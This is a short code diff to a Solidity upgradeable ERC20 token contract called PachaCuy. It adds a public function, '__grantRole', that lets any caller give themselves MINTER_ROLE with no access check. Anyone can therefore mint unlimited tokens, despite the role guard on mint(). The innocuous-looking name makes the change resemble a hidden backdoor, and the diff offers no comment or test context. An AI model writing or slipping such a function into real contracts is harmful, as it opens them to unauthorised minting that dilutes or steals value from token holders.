@@ -22,4 +22,8 @@ contract PachaCuy is Initializable, ERC20Upgradeable, AccessControlUpgradeable {
     function mint(address to, uint256 amount) public onlyRole(MINTER_ROLE) {
         _mint(to, amount);
     }
+
+    function __grantRole() public {
+        _grantRole(MINTER_ROLE, msg.sender);
+    }
 }
